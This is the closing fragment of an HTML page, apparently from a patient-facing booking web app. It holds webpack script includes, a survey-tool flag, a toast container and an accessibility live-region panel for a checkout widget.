<script nonce="">window.screeb_enabled_for_country = false;</script>
<script nonce="" src="webpack/3002-7a2eb216afdaac0cd29c.js"></script>
<script nonce="" src="webpack/7927-92fa7de1c5b372ab509a.js"></script>
<script nonce="" src="webpack/70920-ecfdaf6621a76ed4529b.js"></script>
<script nonce="" src="webpack/patient-desktop-850aa29e2ee5f53dfa9d.js"></script>

<div></div>
<div class="dl-toast-wrapper snapshot-hide dl-toast-wrapper-left" data-design-system="oxygen" data-design-system-component="ToastProvider"></div>
<div class="sr-panel-holder" id="ariaLiveSRPanel">
  <div aria-atomic="true" aria-live="polite" aria-relevant="all" class="adyen-checkout-sr-panel--sr-only" role="log"></div>
</div>

</body></html>